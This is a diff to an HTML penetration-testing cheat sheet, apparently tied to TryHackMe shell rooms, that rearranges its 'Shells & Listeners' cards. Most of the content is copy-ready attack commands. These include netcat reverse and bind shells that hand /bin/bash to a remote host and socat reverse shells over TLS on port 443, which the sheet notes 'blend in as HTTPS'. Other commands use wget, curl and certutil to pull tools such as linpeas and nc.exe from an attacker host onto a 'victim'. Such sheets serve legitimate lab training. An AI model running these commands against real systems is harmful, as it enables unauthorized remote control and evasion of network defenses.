@@ -446,12 +446,20 @@ hashid '$1$...'
 
   <!-- SHELLS -->
   <section class="section" id="shells" style="--pc:var(--access)">
-    <div class="shead"><span class="bar"></span><span class="num">05</span><h2>Reverse Shells &amp; Stabilization</h2><span class="chev">▼</span></div>
-    <div class="sbody"><p class="note">📖 THM room: <a href="https://tryhackme.com/room/shellsfundamentals" target="_blank" rel="noopener">Shells Fundamentals</a> — shells</p><div class="grid">
+    <div class="shead"><span class="bar"></span><span class="num">05</span><h2>Shells &amp; Listeners</h2><span class="chev">▼</span></div>
+    <div class="sbody"><div class="grid">
 
-      <div class="card"><h3>Listener <span class="tag">catch</span></h3>
-        <div class="cmd"><code>nc -lvnp 4444
-rlwrap nc -lvnp 4444              <span class="cm"># arrow-key history</span></code><button class="copy">⧉</button></div>
+      <div class="card"><h3>Reverse vs Bind <span class="tag">which?</span></h3>
+        <p class="note"><b>Reverse</b> — target connects back to <i>your</i> listener. Default choice: beats inbound firewalls / NAT on the target.</p>
+        <p class="note"><b>Bind</b> — target listens, <i>you</i> connect in. Use when the target's outbound is blocked but an inbound port is reachable.</p>
+        <span class="lbl">reverse — listen on attacker, run on target</span>
+        <div class="cmd"><code>nc -lvnp 4444                     <span class="cm"># attacker</span>
+nc LHOST 4444 -e /bin/bash        <span class="cm"># target</span></code><button class="copy">⧉</button></div>
+        <span class="lbl">bind — listen on target, connect in</span>
+        <div class="cmd"><code>nc -lvnp 8080 -e /bin/bash        <span class="cm"># target</span>
+nc TARGET 8080                    <span class="cm"># attacker</span></code><button class="copy">⧉</button></div>
+        <p class="note"><code class="inl">-lvnp</code> = listen · verbose · numeric · port. <code class="inl">rlwrap nc -lvnp 4444</code> adds history/arrows; no <code class="inl">-e</code> (OpenBSD nc)? use the mkfifo payload below. <code class="inl">ncat</code> (nmap) adds SSL/proxy.</p>
+        <p class="note" style="color:var(--faint)">📖 From THM <a href="https://tryhackme.com/room/shellsfundamentals" target="_blank" rel="noopener">Shells &amp; Listeners Fundamentals</a>.</p>
       </div>
 
       <div class="card"><h3>Reverse shell payloads <span class="tag">connect back</span></h3>
@@ -477,28 +485,6 @@ stty raw -echo; fg
 <span class="cm"># back in shell, apply your size:</span>
 stty rows 50 cols 220</code><button class="copy">⧉</button></div>
         <p class="note">Term broken after exit? <code class="inl">stty sane</code> restores it; if blind, type <code class="inl">reset</code> + Enter. Prefix listener with <code class="inl">rlwrap</code> for history/arrows.</p>
-      </div>
-
-      <div class="card"><h3>File transfer <span class="tag">move</span></h3>
-        <span class="lbl">serve from attacker</span>
-        <div class="cmd"><code>python3 -m http.server 80
-impacket-smbserver share . -smb2support</code><button class="copy">⧉</button></div>
-        <span class="lbl">pull onto victim</span>
-        <div class="cmd"><code>wget http://LHOST/linpeas.sh
-curl http://LHOST/f -o f
-certutil -urlcache -f http://LHOST/nc.exe nc.exe   <span class="cm"># windows</span></code><button class="copy">⧉</button></div>
-      </div>
-
-      <div class="card"><h3>Reverse vs Bind <span class="tag">which?</span></h3>
-        <p class="note"><b>Reverse</b> — target connects back to <i>your</i> listener. Default choice: beats inbound firewalls / NAT on the target.</p>
-        <p class="note"><b>Bind</b> — target listens, <i>you</i> connect in. Use when the target's outbound is blocked but an inbound port is reachable.</p>
-        <span class="lbl">reverse (nc)</span>
-        <div class="cmd"><code>attacker: nc -lvnp 4444
-target:   nc LHOST 4444 -e /bin/bash</code><button class="copy">⧉</button></div>
-        <span class="lbl">bind (nc)</span>
-        <div class="cmd"><code>target:   nc -lvnp 8080 -e /bin/bash
-attacker: nc TARGET 8080</code><button class="copy">⧉</button></div>
-        <p class="note">No <code class="inl">-e</code> (OpenBSD nc)? Use the mkfifo one-liner above. <code class="inl">ncat</code> (nmap) adds SSL/proxy over plain <code class="inl">nc</code>.</p>
       </div>
 
       <div class="card"><h3>socat shells <span class="tag">stable</span></h3>
@@ -530,6 +516,16 @@ target:   socat OPENSSL:LHOST:443,verify=0 EXEC:/bin/bash</code><button class="c
         <div class="cmd"><code>attacker: socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
 target:   socat OPENSSL:LHOST:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane</code><button class="copy">⧉</button></div>
         <p class="note">Traffic blends in as HTTPS — use <b>443 / 8443 / 9443</b>. <code class="inl">verify=0</code> accepts the self-signed cert on both ends.</p>
+      </div>
+
+      <div class="card"><h3>File transfer <span class="tag">move</span></h3>
+        <span class="lbl">serve from attacker</span>
+        <div class="cmd"><code>python3 -m http.server 80
+impacket-smbserver share . -smb2support</code><button class="copy">⧉</button></div>
+        <span class="lbl">pull onto victim</span>
+        <div class="cmd"><code>wget http://LHOST/linpeas.sh
+curl http://LHOST/f -o f
+certutil -urlcache -f http://LHOST/nc.exe nc.exe   <span class="cm"># windows</span></code><button class="copy">⧉</button></div>
       </div>
 
     </div></div>
